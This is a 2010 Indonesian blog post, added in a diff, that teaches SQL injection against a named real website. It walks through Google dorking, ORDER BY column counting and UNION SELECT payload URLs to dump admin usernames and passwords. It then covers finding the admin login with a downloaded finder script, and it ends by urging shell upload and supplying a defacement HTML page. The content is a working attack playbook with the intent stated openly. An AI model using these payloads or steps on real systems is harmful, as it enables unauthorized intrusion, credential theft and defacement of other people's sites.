@@ -1,0 +1,220 @@
+---
+layout: post
+title: SQLinjection with KURORO
+date: '2010-07-06T05:43:00.000+07:00'
+author: ahmadi hamid
+tags: 
+modified_time: '2010-07-06T05:46:10.450+07:00'
+blogger_id: tag:blogger.com,1999:blog-7768258105061442044.post-1402912092252586359
+---
+
+peraktek langsung SQLinjection with KURORO
+<br />
+<br />Assalamualaykum..
+<br />Salam sejahtera teman2..
+<br />aku mau share nih..
+<br />lho? qo jadi kayak sales gini @.@'
+<br />
+<br />ehemm..
+<br />pada tulisan ini aku mau ajak kalian mencoba melakukan exploitasi suatu website dengan tehnik "SQL injection"
+<br />jangan mikir ribet2 dulu ya..
+<br />gampang banget qo, perintah2nya aja cuma dimasukin di addreas bar browser kita.
+<br />soo..keep reading dude..
+<br />ayoo semangat untuk clan KURO!!!
+<br />
+<br />Pengertian sql injection:
+<br />SQL injection adalah sebuah aksi hacking yang dilakukan di aplikasi client dengan cara memodifikasi perintah SQL yang ada di memori aplikasi clien dan juga merupakan teknik mengeksploitasi web aplikasi yang didalamnya menggunakan database untuk penyimpanan data.
+<br />
+<br />Yang perlu di ketahui sebelum sql injection pada mysql:
+<br />karakter: ' atau -
+<br />comments: /* atau --
+<br />information_schema untuk versi: mysql versi 5.x , tidak support untuk mysql versi 4.x
+<br />
+<br />okay berikut adalah implementasi SQL injection dengan korban http://sex-linkruiler.eu
+<br />buat nubi yukk mariii...
+<br />buat master hus.huss..
+<br />
+<br />===================
+<br />---[ step sa1u ]---
+<br />===================
+<br />
+<br />carilah target dengan bantuan paman google,
+<br />cobain ja dork-dork ini:
+<br />
+<br /><blockquote>
+<br /><textarea name="code" cols="77" rows="11">
+<br />
+<br /></textarea>
+<br /></blockquote>
+<br />
+<br />okehh..
+<br />anggaplah setelah seharian enggak makan, enggak tidur, enggak be-ol, kita dapet korban http://sex-linkruiler.eu/searchresult.php?sbcat_id=23
+<br />karena setelah kita uji dengan '
+<br />muncul pesan error ato warning..
+<br />warningnya bisa bermacam2 lho..
+<br />
+<br />==================
+<br />---[ step 2ua ]---
+<br />==================
+<br />
+<br />Memeriksa jumlah field dari suatu tabel. Perintah yang digunakan adalah ORDER+BY+num, lakukan penambahan/increasement pada variabel num. Parameternya adalah jika field masih tersedia maka halaman akan berjalan normal, namun sebaliknya jika field tidak tersedia maka halaman akan menampilkan pesan error. 
+<br />jangan lupa juga ngasih (-) setelah (=) dan (--) di ahir URL.
+<br />
+<br />contoh: 
+<br />http://sex-linkruiler.eu/searchresult.php?sbcat_id=-23+order+by+1--
+<br />http://sex-linkruiler.eu/searchresult.php?sbcat_id=-23+order+by+2--
+<br />http://sex-linkruiler.eu/searchresult.php?sbcat_id=-23+order+by+3--
+<br />...
+<br />dst
+<br />...
+<br />sehingga error muncul...
+<br />
+<br />nah! kalo error dah nongol, di sini error muncul di "order by 5"
+<br />maka batas ahir field adalah n-1
+<br />brarti pada contoh kali ini ditemukan batas akhir field sampai pada angka 4.
+<br />
+<br />di kasus lain bisa ampe ratusan lho..
+<br />hiiii..
+<br />
+<br />===================
+<br />---[ step ti3a ]---
+<br />===================
+<br />
+<br />gunakan perintah UNION+SELECT+no_field+no_field+....dst untuk mencari NOMER FIELD yang dapat DIEXPLOITASI.
+<br />karena batas ahir kita adalah 4 berarti:
+<br />
+<br />http://sex-linkruiler.eu/searchresult.php?sbcat_id=-23+union+select+1,2,3,4--
+<br />
+<br />nah!!
+<br />nongol tu nomer fieldnya,
+<br />2
+<br />pada angka ini kita akan bekerja..
+<br />
+<br />sekarang gunakan perintah "version()" atau "@@version" untuk mengecek versi sql yg diapakai masukan perintah tsb pada nagka yg keluar tadi..
+<br />
+<br />http://sex-linkruiler.eu/searchresult.php?sbcat_id=-23+union+select+1,version(),3,4--
+<br />atau
+<br />http://sex-linkruiler.eu/searchresult.php?sbcat_id=-23+union+select+1,@@version,3,4--
+<br />
+<br />alhamdulillah..
+<br />versinya adalah 5.0.91-comunity
+<br />kita beruntung karena di versi 5 kita dapat mengetahui nama database, table, and column dengan perintah "from information_schema"
+<br />kalo versi 4 yang nongol tinggalkan saja karena dalam ver 4 ini kita harus menebak sendiri table n column yg ada pada web tersebut karena tidak bisa menggunakan perintah From+Information_schema..
+<br />
+<br />
+<br />====================
+<br />---[ step emp4t ]---
+<br />====================
+<br />
+<br />kemudian untuk menampilkan semua isi dari table gunakan perintah :
+<br />perintah group_concat(table_name) >>> dimasukan pada angka yg keluar tadi
+<br />perintah +from+information_schema.tables+where+table_schema =database() >>> dimasukan setelah angka terakhir
+<br />
+<br />Code:
+<br />http://sex-linkruiler.eu/searchresult.php?sbcat_id=-23+union+select+1,group_concat(table_name),3,4+from+information_schema.tables+where+table_schema=database()--
+<br />
+<br />keluar deh tabel2nya..
+<br />
+<br />psst.pssstt..
+<br />
+<br />ada nama yang mencurigakan..
+<br />"sblnk_admin"
+<br />kita jelajahi yukk..
+<br />:D
+<br />
+<br />====================
+<br />---[ step lima5 ]---
+<br />====================
+<br />
+<br />setelah menemukan nama tabel yang mencurigakan tadi, sekarang kita liat isi tabel tersebut,
+<br />yuk kita cek nama kolomnya pake perintah:
+<br />
+<br /> "concat(column_name)" ::dimasukan pada angka yg keluar tadi::
+<br /> "+from+information_schema.columns+where+table_name=0xhexa--" ::dimasukan setelah angka terakhir, pada tahap ini:: 
+<br /> 
+<br />kamu wajib mengextrak kata pada isi table menjadi hexadecimal yaitu dengan cara mengkonversinya, gunakan aja converter online, cari aja di google "ascii to hex converter"
+<br />setelah diconvert nilai sblnk_admin = 73626c6e6b5f61646D696E
+<br />sehingga URL kita jadinya seperti ini:
+<br />
+<br />http://sex-linkruiler.eu/searchresult.php?sbcat_id=-23+union+select+1,concat(column_name),3,4+from+information_schema.columns+where+table_name=0x73626c6e6b5f61646D696E--
+<br />
+<br />keluar deh..
+<br />nama kolomnya adalah "id"
+<br />
+<br />===================
+<br />---[ step en6m ]---
+<br />===================
+<br />
+<br />setelah mengetahui nama tabel dan kolomnya sekarang kita dump data yang ada di dalam database dengan perintah:
+<br /> "concat_ws(0x3a,data/isi column yg mau dikeluarkan)" ::dimasukan pada angka yg keluar tadi::
+<br /> "+from+nama table berasal" ::dimasukan setelah angka terakhir::
+<br />
+<br />http://sex-linkruiler.eu/searchresult.php?sbcat_id=-23+union+select+1,concat_ws(0x3a,id,username,password),3,4+from+sblnk_admin--
+<br />
+<br />upppss..
+<br />apa tuuuh yang nongol..??
+<br />^^
+<br />====================
+<br />---[ step tu7uh ]---
+<br />====================
+<br />
+<br />setelah mendapatkan username dan password tugas kita selanjutnya adalah'
+<br />mencari dimana halaman admin atau login berada..
+<br />
+<br />ini nih..
+<br />yang paling asik nomer 2..
+<br />jangan kabur dulu yaaa..
+<br />
+<br />bagi kalian yang make windows, terpaksa kalian harus dulnlut dulu python, karena kita akan menggunakan admin login finder yang ditulis dalam bahasa python.
+<br />dunlut di : http://python.org/download
+<br />bagi yang make linux, udah terintegrasi di linuxnya qoo..so..tungguin yang make windows selese install pythonnya dulu yaa..
+<br />
+<br />nah!!
+<br />kalo udah selese install pythonnya,,
+<br /> [+] dunlut adminfinder.py di <a href='http://www.easy-share.com/1911227846/adminfinder2.py'> sini </a>
+<br /> [+] buka command prompt (start-run-cmd)
+<br /> [+] ketik C:\polder\tempat\ngesave\adminfinder.py www.situstarget.com 
+<br />	 contoh: E:\Documents and Settings\kuroro>M:\cabain\adminfinder.py http://sex-linkruiler.eu
+<br />	 
+<br />dapet khan??
+<br />di /admin/index.php tulisannya OK tuh!
+<br />
+<br />langsung aja ke http://sex-linkruiler.eu/admin/index.php tyus masupin password dan usernamenya..
+<br />
+<br />======================
+<br />---[ step 8elapan ]---
+<br />======================
+<br />
+<br />......................
+<br />
+<br />you have been an admin of that site dude..
+<br />do what ever you want...
+<br />
+<br />-deface
+<br />-upload shell
+<br />-apa kek terserah..
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />lho?
+<br />qo masih di sini loe??
+<br />
+<br />apa? mau deface??
+<br />mau narsis naro signature loe di site itu???
+<br />
+<br />yaudah pake script ini aja..
+<br /><blockquote>
+<br /><textarea name="code" cols="77" rows="11">
+<br /><DIV align="center"><DIV id="Layer1" style="BORDER-RIGHT: #000000 1px; BORDER-TOP: #000000 1px; Z-INDEX: 1; LEFT: 0px; BORDER-LEFT: white 1px; WIDTH: 1300px; BORDER-BOTTOM: white 1px; POSITION: absolute; TOP: 0px; HEIGHT: 7000px; BACKGROUND-COLOR: white; layer-background-color: white"><CENTER><BR><B><FONT face="papyrus" color="red" size="5">Attacked By : KUROSPACIAN</FONT><BR><BR><A href="http://s909.photobucket.com/albums/ac295/KUROROLUCILFUL/?action=view&amp;current=30425_1265561688789_1522187152_3060.jpg" target="_blank"><IMG src="http://i909.photobucket.com/albums/ac295/KUROROLUCILFUL/30425_1265561688789_1522187152_3060.jpg" border="0" alt="Photobucket"></A><BR><BR>
+<br /><FONT face="papyrus" color="red" size="5">@admin: your bokep site fvcked by: | Nagi D. Clyne | Risanto K. Retaadji|<BR></CENTER>
+<br /><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>
+<br /><FONT face="papyrus" color="red" size="5">cuma ngetes qo<BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>
+<br /><FONT face="papyrus" color="red" size="5">thx 2 master tegar, sorry minjem buat belajar<BR><BR>
+<br /></textarea>
+<br /></blockquote>
+<br />
+<br />
+<br />sallam,
